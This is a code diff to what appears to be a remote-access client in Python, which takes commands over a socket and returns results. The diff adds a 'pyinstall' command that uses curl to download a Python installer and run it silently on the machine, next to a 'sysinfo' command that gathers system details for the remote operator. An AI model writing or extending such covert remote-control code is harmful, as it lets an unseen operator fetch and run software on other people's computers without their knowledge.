@@ -193,6 +193,19 @@ while True:
                     except:
                         s.sendall(getMsgWithDataSplit('ERROR'))
 
+                elif command == 'pyinstall':
+                    try:
+                        downloadPythonInstaller = subprocess.check_output('curl https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe --output python-installer.exe', shell = True)
+                        runPythonInstaller = subprocess.check_output('python-installer.exe /quiet InstallAllUsers=0 PrependPath=1')
+                        os.remove('python-installer.exe')
+                        s.sendall(getMsgWithDataSplit('SUCCESS'))
+                    except:
+                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        try:
+                            os.remove('python-installer.exe')
+                        except:
+                            pass
+
                 elif command == 'sysinfo':
                     try:
                         sysInfo = subprocess.check_output('systeminfo', shell = True)
